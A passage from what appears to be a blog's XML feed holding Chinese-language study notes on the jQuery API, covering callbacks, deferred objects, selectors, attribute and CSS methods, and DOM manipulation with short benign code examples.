<li><p><code>$.extend()</code> 将多个对象，合并到第一个对象， <code>$.merge()</code> 合并两个数组内容到第一个数组（这两个方法均会改变第一个对象/数组）</p>
<blockquote>
<p><code>var newArray = $.merge([], oldArray);</code> // 用作拷贝方法</p>
</blockquote>
</li>
<li><p><code>$.contains(container, contained)</code> 检查弟二个 DOM 元素是否为弟一个 DOM 元素（原生 DOM）的后代</p>
</li>
<li><code>$.noop()</code> 返回一个空函数</li>
<li><code>$.now()</code> 相当于 <code>new Date().getTime()</code></li>
<li><code>$.parseJSON(&#39;JSON&#39;)</code> 解析严格的JSON返回JS对象， <code>$.parseXML(&#39;XML&#39;)</code> 解析XML， <code>$.parseHTML(&#39;HTML&#39;)</code> 将字符串解析到一个 DOM 节点的数组</li>
</ul>
<h4 id="DOM元素方法及内部构件"><a href="#DOM元素方法及内部构件" class="headerlink" title="DOM元素方法及内部构件"></a>DOM元素方法及内部构件</h4><ul>
<li><code>.get([index])</code> 检索匹配 jQuery 对象得到对应的 DOM 元素， 指定了 <code>index</code> 参数则会获取单个元素（类似<code>$(&#39;selector&#39;)[index]</code>，但可以指定负值）</li>
<li><code>.index()</code> 与 <code>.get()</code> 正好相反, 接受节点返回其索引值</li>
<li><code>.toArray()</code> 返回一个包含 jQuery 对象集合中的所有 DOM 元素的标准数组。</li>
<li><code>$.fn.jquery</code> 返回当前使用 jQuery 的版本</li>
<li><code>.length</code>与 <code>.size()</code> 均为返回 jQuery 对象中元素的数量</li>
</ul>
<h2 id="回调对象"><a href="#回调对象" class="headerlink" title="回调对象"></a>回调对象</h2><blockquote>
<p><code>jQuery.Callbacks()</code> 函数返回一个全能的对象，此对象对管理回调列表提供了强大的方式。它能够增加、删除、触发、禁用回调函数</p>
<p>回调对象类似于保存了一个回调函数列表，使用 <code>fire</code> 方法时，将会按列表顺序分别传入参数调用这些函数</p>
</blockquote>
<ul>
<li><p>回调对象的方法，这些方法均返回绑定它的那个回调对象 <code>this</code> 以实现链式调用</p>
<ul>
<li><code>callbacks.add( callbacks )</code> 用来向回调列表中添加一个回调或回调的集合</li>
<li><code>callbacks.remove( callbacks )</code> 从回调列表中删除一个回调或回调集合</li>
<li><code>callbacks.fire( arguments )</code> 传入指定的参数调用所有的回调</li>
<li><code>callbacks.disable()</code> 禁用回调列表中的回调</li>
</ul>
</li>
<li><p><code>$.Callbacks( flags )</code> flags 的参数代如下（参数可同时传入多个，类似同时满足 <code>&amp;&amp;</code>）</p>
<ul>
<li><code>&#39;once&#39;</code> 只能执行一次 <code>fire()</code></li>
<li><code>&#39;memory&#39;</code> 保存前面 <code>fire</code> 传入的参数，后面加入的新回调会被自动传入前面保存的参数并执行</li>
<li><code>&#39;unique&#39;</code> 一次只能添加一个回调，回调列表不出现重复回调</li>
<li><code>&#39;stopOnFalse&#39;</code> 当一个回调返回 <code>false</code> 时中断调用</li>
</ul>
</li>
<li><p>回调对象的最典型应用是快速实现一个 观察者模式（又叫订阅/发布）</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 定义一个保存自定义事件的列表</span></div><div class="line"><span class="keyword">var</span> taskList = &#123;&#125;</div><div class="line"></div><div class="line">jQuery.Task = <span class="function"><span class="keyword">function</span> (<span class="params">id</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> task = id &amp;&amp; taskList[id] <span class="comment">// 取出对应任务</span></div><div class="line">  <span class="keyword">if</span> (!task) &#123; <span class="comment">// 若任务不存在，则创建</span></div><div class="line">    callbacks = jQuery.Callbacks()</div><div class="line">    task = &#123;</div><div class="line">      <span class="attr">publish</span>: callbacks.fire,</div><div class="line">      <span class="attr">subscribe</span>: callbacks.add,</div><div class="line">      <span class="attr">unsubscribe</span>: callbacks.remove</div><div class="line">    &#125;;</div><div class="line">    <span class="comment">// 将任务加到事件列表</span></div><div class="line">    <span class="keyword">if</span> (id) &#123;</div><div class="line">      taskList[id] = task</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  <span class="comment">// 返回取得或创建的 task</span></div><div class="line">  <span class="keyword">return</span> task</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="延迟对象"><a href="#延迟对象" class="headerlink" title="延迟对象"></a>延迟对象</h2><blockquote>
<p>关于延迟对象的具体用法，请参考 <code>阮一峰</code> 的 <a href="http://www.ruanyifeng.com/blog/2011/08/a_detailed_explanation_of_jquery_deferred_object.html" target="_blank" rel="external">jQuery 的 deferred 对象详解</a></p>
<p>理解 jQuery 的延迟对象，可以从理解 <strong>Promise</strong> 开始，本质上是对 Promise 的封装实现</p>
<p>延迟对象是 jQuery 很多方法实现的基础，如 <strong>AJAX</strong>，对异步编程提供了统一风格的 API</p>
<p>如果一个方法的执行依赖于多个请求结果，那么使用延迟对象（Promise）将大大松散代码结构耦合并提高可读性</p>
</blockquote>
<ul>
<li><p>采用链式写法，因此可以方便地为一个操作添加多个执行回调，按添加顺序执行</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$.ajax(<span class="string">"test.html"</span>)</div><div class="line">  .done(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;alert(<span class="string">"哈哈，成功了！"</span>)&#125; )</div><div class="line">  .fail(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;alert(<span class="string">"出错啦！"</span>)&#125; )</div><div class="line">  .done(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;alert(<span class="string">"第二个回调函数！"</span>)&#125; )</div></pre></td></tr></table></figure>
</li>
<li><p><code>$.when()</code> 方法可以为同一个方法添加多个回调（类似 <code>Promise.all()</code>），它只接受 <strong>Deferred</strong> 对象作为参数</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 下面两个 ajax 都成功了才会调用 done，只要有一个失败了就调用 fail</span></div><div class="line">$.when($.ajax(<span class="string">"test1.html"</span>), $.ajax(<span class="string">"test2.html"</span>))</div><div class="line">　.done(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; alert(<span class="string">"哈哈，成功了！"</span>)&#125;)</div><div class="line">　.fail(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; alert(<span class="string">"出错啦！"</span>)&#125;)</div></pre></td></tr></table></figure>
</li>
<li><p>封装普通函数使其成为 Deferred 对象可以用 <code>deferred.resolve()</code> 和 <code>deferred.reject()</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> wait = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="comment">// 新建一个deferred对象，作为私有变量</span></div><div class="line">  <span class="keyword">var</span> dtd = $.Deferred() <span class="comment">// 这里也可以放在外面，而非闭包方式，但这有可能被外部使用 dtd.resolve() 等触发状态改变</span></div><div class="line"></div><div class="line">  <span class="comment">// 封装一个耗时的请求</span></div><div class="line">  $.get(<span class="string">'/someurl'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (res.code === <span class="number">200</span>) &#123;</div><div class="line">      dtd.resolve() <span class="comment">// 请求成功</span></div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">      dtd.reject() <span class="comment">// 请求失败</span></div><div class="line">    &#125;</div><div class="line">  &#125;)</div><div class="line">  <span class="keyword">return</span> dtd <span class="comment">// 返回闭包</span></div><div class="line">  <span class="comment">// 也可以使用 return dtd.Primose()，这样返回一个新的 Deferred 对象 不能被外部的方法触发改变原来的 dtd</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// 现在 wait() 函数生成一个 Deferred 对象了，可以作为 $.when() 的参数啦</span></div><div class="line">$.when(wait())</div><div class="line">  .done(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;alert(<span class="string">"哈哈，请求成功了！"</span>)&#125;)</div><div class="line">  .fail(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;alert(<span class="string">"请求错啦！"</span>)&#125;)</div></pre></td></tr></table></figure>
</li>
<li><p><code>deferred.promise()</code> 会包装生成一个对象为 Deferred 对象，使其拥有 Deferred 接口</p>
</li>
<li><p>以下是几种 API 的汇总用法</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$.when(wait())</div><div class="line">  .then(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;alert(<span class="string">"成功时看到我"</span>)&#125;, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;alert(<span class="string">"失败时看到我"</span>)&#125;)</div><div class="line">　.done(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;alert(<span class="string">"成功时看到我"</span>)&#125;)</div><div class="line">  <span class="comment">// 以下三种失败方法等同，推荐用 .catch，与 ES6 一致</span></div><div class="line">  .then(<span class="literal">null</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;alert(<span class="string">"失败时看到我"</span>)&#125;)</div><div class="line">　.fail(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;alert(<span class="string">"失败时看到我"</span>)&#125;)</div><div class="line">  .catch(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;alert(<span class="string">"失败时看到我"</span>)&#125;)</div><div class="line"></div><div class="line">  .always(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;alert(<span class="string">"成功或失败都看到我"</span>)&#125;)</div></pre></td></tr></table></figure>
</li>
<li><p><code>deferred.state()</code> 用来判断当前的 Promise 状态，返回下列三种字符串</p>
<ul>
<li>‘pending’ 尚未完成</li>
<li>‘resolved’ 被解决</li>
<li>‘rejected’ 被拒绝</li>
</ul>
</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
<p>最后总结一下，jQuery 虽然简单易学，但毕竟是一门基于 JavaScript 的库，本质上还是要理解这个语言的核心。实际开发中，个人也进行了不少的思考，毕竟需要兼容低版本浏览器是不二之选。</p>
<p>但也有个血泪的教训就是，很多时候太依赖 jQuery 了，导致经常需要查找手册才知道原生的方法实现（毕竟哲学是 write less，do more）</p>
</blockquote>
<ul>
<li>相关书籍推荐<ul>
<li><a href="https://item.jd.com/11019625.html" target="_blank" rel="external">《锋利的jQuery》</a>，精品国产书，毫无上手难度的一本书，对新手而言极为推荐，有很多精心设计的demo。</li>
<li><a href="https://item.jd.com/11336695.html" target="_blank" rel="external">jQuery基础教程（第4版）</a>，图灵出版的精品，虽然是基础教程，但后半部分讲解的内容，很多是需要一定的实战积累才能理解其巧妙，建议作为进阶书籍。</li>
</ul>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;续，非DOM操作的部分，这里提供了很多小工具，但精华的部分还是关于回调对象和延迟对象。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>jQuery API 学习小扎（上）</title>
    <link href="https://github.com/Hyifu/2015/11/07/jQuery-API%E5%AD%A6%E4%B9%A0%E5%B0%8F%E6%89%8E%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
    <id>https://github.com/Hyifu/2015/11/07/jQuery-API学习小扎（上）/</id>
    <published>2015-11-06T16:00:00.000Z</published>
    <updated>2017-04-17T02:12:35.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>作为一个专业的前端开发，你真的会用 jQuery 吗？jQuery 的精妙，随着我对 JavaScript 的理解的加深而愈加感到惊讶  </p>
<p>其实，如果我们不需要进行对 DOM 的操作兼容（主要针对 IE），那么大抵可以完全抛弃 jQuery，毕竟 ES5 和 DOM-Lv2 已经提供了很多 jQuery 常用的功能了，既然使用 jQuery 是为了开发效率和兼容性考量，那么我是很推荐尽量使用 jQuery 提供的大部分功能，毕竟这样对代码阅读者和书写者都是很舒服的事情，使用 <code>$.each()</code> 代替了常规的 <code>for</code> 循环，使用 <code>$.isEmptyObject(object)</code> 来判断空对象，等等</p>
<p>很多人觉得使用 jQuery 不够高端，甚至觉得它会带来性能问题，但其实我认为，对于快速迭代的考虑，代码的可读性和兼容性优先级要远高于那点可怜的性能加成（事实上，自己造的轮子真不一定比 jQuery 性能好，简单的例子，jQuery 通常会考虑缓存 DOM，同时不会忘记卸载过期事件）</p>
</blockquote>
<a id="more"></a>
<p>本文档基于 <em><a href="http://www.css88.com/jqapi-1.9/" target="_blank" rel="external">jQuery API 中文文档</a></em> 总结</p>
<h2 id="关于jQuery的最佳实践"><a href="#关于jQuery的最佳实践" class="headerlink" title="关于jQuery的最佳实践"></a>关于jQuery的最佳实践</h2><blockquote>
<p>可参考 <em>阮一峰</em> 的整理 <a href="http://www.ruanyifeng.com/blog/2011/08/jquery_best_practices.html" target="_blank" rel="external">jQuery最佳实践</a>，关键点如下：</p>
</blockquote>
<ol>
<li>使用最新版本的 jQuery</li>
<li>用对选择器（尽量用 ID）</li>
<li>理解子元素和父元素的关系</li>
<li>不要过度使用 jQuery</li>
<li>做好缓存</li>
<li>使用链式写法</li>
<li>事件的委托处理</li>
<li>少改动 DOM 结构</li>
<li>正确处理循环</li>
<li>尽量少生成 jQuery 对象</li>
<li>选择作用域链最短的方法</li>
<li>使用 <strong>Pub / Sub</strong> 模式管理事件（观察者模式）</li>
</ol>
<h2 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h2><blockquote>
<p>jQuery 实现的选择器方法很多已经大放异彩，堪称业界典范，同时这个抽出来单独作为一个标准——Sizzle 选择器引擎</p>
</blockquote>
<h4 id="避免使用的选择器"><a href="#避免使用的选择器" class="headerlink" title="避免使用的选择器"></a>避免使用的选择器</h4><blockquote>
<p>以下的选择器均有或多或少的性能问题，主要原因是无法充分利用原生 DOM 提供的 <code>querySelectorAll()</code> 方法</p>
</blockquote>
<ul>
<li><code>$(&#39;*&#39;)</code></li>
<li><code>$(&#39;:eq&#39;)</code></li>
<li><code>$(&#39;:gt&#39;)</code></li>
<li><code>$(&#39;:lt&#39;)</code></li>
<li><code>$(&#39;:not&#39;)</code></li>
<li><code>$(&#39;:has&#39;)</code></li>
<li><code>$(&#39;:file&#39;)</code> （建议替换成 <code>$(&#39;selector[type = &quot;file&quot;]&#39;)</code>）</li>
<li><code>$(&#39;:checkbox&#39;)</code> （建议替换成 <code>$(&#39;selector[type = &quot;checkbox&quot;]&#39;)</code>）</li>
<li><code>$(&#39;:image&#39;)</code> （建议替换成 <code>$(&#39;selector[type = &quot;image&quot;]&#39; )</code>）</li>
<li><code>$(&#39;:password&#39;)</code> （建议替换成 <code>$(&#39;selector[type = &quot;password&quot;]&#39;)</code>）</li>
<li><code>$(&#39;:radio&#39;)</code> （建议替换成 <code>$(&#39;selector[type = &#39;radio&#39;]&#39;)</code>）</li>
<li><code>$(&#39;:reset&#39;)</code> （建议替换成 <code>$(&#39;selector[type = &#39;reset&#39;]&#39;)</code>）</li>
<li><code>$(&#39;[attribute != &quot;value&quot;]&#39;)</code> （建议替换成 <code>$(&#39;class&#39;)</code> ）</li>
</ul>
<h4 id="尽量先使用纯CSS选择器，再使用-filter-39-selector-39-代替的选择器"><a href="#尽量先使用纯CSS选择器，再使用-filter-39-selector-39-代替的选择器" class="headerlink" title="尽量先使用纯CSS选择器，再使用 .filter(&#39;selector&#39;) 代替的选择器"></a>尽量先使用纯CSS选择器，再使用 <code>.filter(&#39;selector&#39;)</code> 代替的选择器</h4><ul>
<li><p><code>$(&#39;:hidden&#39;)</code> 和 <code>$(&#39;:visible&#39;)</code></p>
<blockquote>
<p><code>visibility: hidden</code> 或 <code>opacity: 0</code> 在 jQuery 中被认为是可见的，因为他们仍然占据布局空间<br>相对地，不可见主要根据以下四点判断（jQuery 3.0 对该标准有所修改）</p>
</blockquote>
<ul>
<li>他们的CSS <code>display</code> 值是 <code>none</code></li>
<li>他们是 <code>type=&quot;hidden&quot;</code> 的表单元素</li>
<li>它们的宽度和高度都显式设置为 <code>0</code></li>
<li>一个祖先元素是隐藏的，因此该元素是不会在页面上显示</li>
</ul>
</li>
<li><code>$(&#39;:animated&#39;)</code></li>
<li><code>$(&#39;:even&#39;)</code> 和 <code>$(&#39;:odd&#39;)</code>（注意与 <code>$(&#39;:nth-child(even)&#39;)</code> 及 <code>$(&#39;:nth-child(odd)&#39;)</code> 的区别）</li>
<li><code>$(&#39;:first&#39;)</code> 和 <code>$(&#39;:last&#39;)</code></li>
<li><code>$(&#39;:header&#39;)</code></li>
<li><code>$(&#39;:empty&#39;)</code> 和 <code>$(&#39;:parent&#39;)</code> 涉及到的子元素包括文本节点</li>
<li>表单元素：<code>$(&#39;:button&#39;)</code>，<code>$(&#39;:input&#39;)</code>，<code>$(&#39;:selected&#39;)</code>，<code>$(&#39;:submit&#39;)</code>，<code>$(&#39;:text&#39;)</code></li>
</ul>
<h4 id="比较特殊的选择器"><a href="#比较特殊的选择器" class="headerlink" title="比较特殊的选择器"></a>比较特殊的选择器</h4><ul>
<li><code>$(&#39;:target&#39;)</code></li>
<li><code>$(&#39;:lang&#39;)</code></li>
<li><code>$(&#39;:root&#39;)</code> （建议换用 <code>$(&#39;html&#39;)</code> 替换，提高可读性）</li>
<li><code>$(&#39;:contains(text)&#39;)</code> 查找的一个文本字符串，区分大小写</li>
<li><code>$(&#39;:nth-child(n)&#39;)</code> 索引从1开始</li>
<li><code>$(&#39;:focus&#39;)</code> 如果正在寻找当前的焦点元素，可使用 <code>$(document.activeElement)</code> 检索，而不必查找整个 DOM 树</li>
<li><code>$(&#39;:disabled&#39;)</code> 检查元素的 <code>disabled</code> 属性的布尔值，<code>$([&#39;type = &quot;disabled&quot;]&#39;)</code> 检查是否存在的 <code>disabled</code> 属性</li>
</ul>
<h2 id="CSS和属性"><a href="#CSS和属性" class="headerlink" title="CSS和属性"></a>CSS和属性</h2><h4 id="用法区别"><a href="#用法区别" class="headerlink" title="用法区别"></a>用法区别</h4><ul>
<li><code>.prop()</code> 方法 方法返回 <code>property</code> 的布尔值，<code>.attr()</code> 方法返回 <code>attributes</code> 的字面量值，区别使用</li>
<li><code>.prop()</code>，<code>.attr()</code>，<code>.val()</code>，<code>.css()</code> 等方法只获取或设置第一个匹配元素的属性值 。如果元素上没有该属性，或者如果没有匹配的元素。那么该方法会返回 <code>undefined</code> 值</li>
<li><code>.css(&#39;height&#39;)</code> 和 <code>.height()</code> 之间的区别是后者返回一个没有单位的数值（例如，400），前者是返回带有完整单位的字符串（例如，400px）</li>
<li><p>尺寸计算方法间的区别<br><img src="http://www.css88.com/jqapi-1.9/images/0042_04_01.png" alt="height"><br><img src="http://www.css88.com/jqapi-1.9/images/0042_04_02.png" alt="innderHeight"><br><img src="http://www.css88.com/jqapi-1.9/images/0042_04_03.png" alt="outerHeight"><br><img src="http://www.css88.com/jqapi-1.9/images/0042_04_04.png" alt="width"><br><img src="http://www.css88.com/jqapi-1.9/images/0042_04_05.png" alt="innerWidth"><br><img src="http://www.css88.com/jqapi-1.9/images/0042_04_06.png" alt="outerWidth"></p>
</li>
<li><p>计算 <code>window</code> 和 <code>document</code> 的高度</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 获取浏览器视口宽高 viewport</span></div><div class="line">$(<span class="built_in">window</span>).height();</div><div class="line"><span class="comment">// 获取文档宽高 document</span></div><div class="line">$(<span class="built_in">document</span>).height();</div></pre></td></tr></table></figure>
</li>
<li><p><code>.offset()</code> 方法检索一个元素相对于文档 <code>document</code> 的当前位置。和 <code>.position()</code> 的差别是：<code>.position()</code> 是相对于相对于父级元素的位移</p>
</li>
<li><code>.offsetParent()</code> 取得离指定元素最近的含有定位信息的祖先元素</li>
</ul>
<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ul>
<li><p>当设置样式名 <code>(&quot;class&quot;)</code> 属性时，必须使用引号，因为 <code>class</code> 是 JavaScript 标识符，为保持风格统一和安全，建议 API 调用传入类似对象的属性名均使用引号，如下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$(<span class="string">'body'</span>).attr(&#123;</div><div class="line">  <span class="string">'alt'</span>: <span class="string">'Beijing Brush Seller'</span>,</div><div class="line">  <span class="string">'class'</span>: <span class="string">'photo'</span></div><div class="line">&#125;);</div></pre></td></tr></table></figure>
</li>
<li><p><code>.prop()</code>，<code>.attr()</code></p>
<blockquote>
<p><strong>Properties</strong> 属性一般影响 DOM 元素的状态并不会改变序列化的 <strong>HTML attribute</strong> 属性。例如，<code>input</code> 元素的 <code>value</code> 属性，<code>input</code> 和 <code>button</code> 元素的 <code>disabled</code> 属性，以及 <code>checkbox</code> 的 <code>checked</code> 属性。应该使用 <code>.prop()</code> 方法设置 <code>disabled</code> 和 <code>checked</code> 属性，而不是使用 <code>.attr()</code> 方法</p>
<p><code>.val()</code> 方法应该用于存取 <code>value</code> 值。还要注意的是 <code>.removeProp()</code> 方法不应该被用来设置这些属性为 <code>false</code>。一旦原生的属性被移除，就无法再被添加</p>
<p>在 <strong>IE8</strong> 及以下版本，不要使用 <code>.prop()</code> 对非基本类型（<code>number</code>、<code>string</code> 或 <code>boolean</code>）的属性赋值，为了安全请使用 <code>.data()</code> 方法</p>
<p>尺寸相关的 API 返回的数字， 包括的 <code>.height()</code>， 在某些情况下可能带有小数。你的代码不应该假定它是一个整数。  另外，当页面被用户缩放时，返回的尺寸可能是不正确的;浏览器没有一个公开的 API 来检测这种情况。</p>
<p>当元素或其父元素被隐藏时，<code>.height()</code> 得到的值不能保证准确。要得到准确的值，你应该确保该元素在使用 <code>.height()</code> 前可见。jQuery 将尝试临时显示，然后再隐藏元素来测量元素尺寸，但这是不可靠的，（即使得到准确的值）也会显著影响页面的性能。这总临时显示然后再隐藏的测量功能，可能在 jQuery 未来的版本中删除。</p>
</blockquote>
</li>
</ul>
<h4 id="实用技巧"><a href="#实用技巧" class="headerlink" title="实用技巧"></a>实用技巧</h4><ul>
<li><p>通过函数回调的方法动态获取 / 修改属性等</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 适用于.prop(), .attr(), .val(), .addClass(), .removeClass(), .css(), toggleClass()</span></div><div class="line">$(<span class="string">'div'</span>).attr(<span class="string">'title'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">index, val</span>) </span>&#123;</div><div class="line">	<span class="keyword">return</span> index + val; <span class="comment">// index 为索引，val为属性title的值</span></div><div class="line">&#125;);</div><div class="line"><span class="comment">//实际应用</span></div><div class="line">$(<span class="string">'img'</span>).attr(<span class="string">'src'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> <span class="string">'/resources/'</span> + <span class="keyword">this</span>.title; <span class="comment">// title为图片名，动态修改其相对路径</span></div><div class="line">&#125;);</div></pre></td></tr></table></figure>
</li>
<li><p><code>.val()</code> 方法</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 通过 .val() 方法从 textarea 元素中取得的值是不含有回车（\r）字符的。</span></div><div class="line"><span class="comment">// 但是如果该值是通过 XHR 传递给服务器的，回车（\r）字符会被保留（或者是被浏览器添加的，但是在原始数据中并不包含回车（\r））。</span></div><div class="line">$.valHooks.textarea = &#123; <span class="comment">// 原始数据中保留回车（\r）字符</span></div><div class="line">  get: <span class="function"><span class="keyword">function</span> (<span class="params">elem</span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> elem.value.replace( <span class="regexp">/\r?\n/g</span>, <span class="string">"\r\n"</span> );</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="特殊"><a href="#特殊" class="headerlink" title="特殊"></a>特殊</h4><ul>
<li><code>$.cssHooks</code> <em>直接向 jQuery 中添加钩子，用于覆盖设置或获取特定 <strong>CSS </strong> 属性时的方法，目的是为了标准化 <em>*CSS</em></em> 属性名或创建自定义属性</li>
<li><code>.toggleClass()</code> 可以传入 <strong>Boolean</strong> 值或回调函数来灵活调整切换</li>
</ul>
<h4 id="避免使用"><a href="#避免使用" class="headerlink" title="避免使用"></a>避免使用</h4><ul>
<li><code>$.data( element, key, value )</code> <em>存储任意数据到指定的元素，返回设置的值。</em> 允许我们在DOM元素上绑定任意类型的数据，避免了循环引用的内存泄漏风险, 这是一个底层的方法，你应该用 <code>.data()</code> 代替</li>
</ul>
<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><h4 id="用法区别-1"><a href="#用法区别-1" class="headerlink" title="用法区别"></a>用法区别</h4><ul>
<li><code>.prepend(&#39;将要插入的内容&#39;)</code> 和 <code>.prependTo(&#39;位置&#39;)</code> 均为 <strong>内部</strong> 插入后面， <code>.append(&#39;将要插入的内容&#39;)</code> 和<code>.appendTo(&#39;位置&#39;)</code> 均为 <strong>内部</strong> 插入前面</li>
<li><code>.after(&#39;将要插入的内容&#39;)</code> 和 <code>.insertAfter(&#39;位置&#39;)</code> 均为 <strong>外部</strong> 插入后面，<code>.before(&#39;将要插入的内容&#39;)</code> 和<code>.insertBefore(&#39;位置&#39;)</code> 均为 <strong>外部</strong> 插入前面</li>
<li><code>.empty()</code> 移除节点内容（不含节点）并解除数据 / 事件关联，<code>.remove()</code> 移除节点内容（含节点）并解除数据 / 事件关联，<code>.detach()</code> 移除节点内容（含节点）但不解除数据 / 事件关联（再插回来还能用）</li>
<li><code>.unwrap()</code> 删除元素的父级元素。和 <code>.wrap()</code> 的相反</li>
<li><code>.replaceAll(&#39;位置&#39;)</code> 和 <code>.replaceWith(&#39;内容&#39;)</code> 功能类似，目标和源相反，用来替换的元素从老地方移到新位置，而不是复制，并且会删除与节点相关联的所有数据和事件处理程序</li>
</ul>
<h4 id="特殊-1"><a href="#特殊-1" class="headerlink" title="特殊"></a>特殊</h4><ul>
<li><code>.clone([withDataAndEvents] [, deepWithDataAndEvents])</code> 深度复制所有匹配的元素集合，包括所有匹配元素、匹配元素的下级元素、文字节点</li>
</ul>
<h4 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h4><ul>
<li><p>使用 <code>.html()</code> 时元素中的任何内容会完全被新的内容取代。新的内容替换前，jQuery 从子元素删除其他结构，如数据和事件处理程序（这样可以防止内存溢出）</p>
<blockquote>
<p>在 <strong>IE</strong> 中（包括 IE9），设置 <strong>HTML</strong> 元素的文本内容可能会破坏其子节点的文本节点，结果导致子节点的文本节点从文档中被删除。如果你想保留这些 DOM 元素的引用，需要他们将保持不变，请使用 <code>.empty()</code> 来代替 <code>.html(string)</code>以便从文档中删除元素之前的元素被分配到新的字符串</p>
</blockquote>
</li>
<li><p>要设置一个 <code>&lt;script&gt;</code> 元素的内容， 其不包含 <strong>HTML</strong>， 使用 <code>.text()</code> 方法而不是 <code>.html()</code>， <code>.text()</code> 方法不能使用在 <code>input</code> 元素或 <code>scripts</code> 元素上。<code>input</code> 或 <code>textarea</code> 需要使用 <code>.val()</code> 方法获取或设置文本值。得到 <code>scripts</code> 元素的值，使用 <code>.html()</code> 方法</p>
</li>
</ul>
<h2 id="遍历"><a href="#遍历" class="headerlink" title="遍历"></a>遍历</h2><h4 id="用法区别-2"><a href="#用法区别-2" class="headerlink" title="用法区别"></a>用法区别</h4><ul>
<li><p><code>.filter(function(index))</code> 通过函数来进行高级筛选</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$(<span class="string">'li'</span>).filter(<span class="function"><span class="keyword">function</span> (<span class="params">index</span>) </span>&#123; <span class="comment">//this是当前DOM元素，index为索引</span></div><div class="line">  <span class="keyword">return</span> $(<span class="string">'strong'</span>, <span class="keyword">this</span>).length == <span class="number">1</span>;</div><div class="line">&#125;).css(<span class="string">'background-color'</span>, <span class="string">'red'</span>);</div></pre></td></tr></table></figure>
</li>
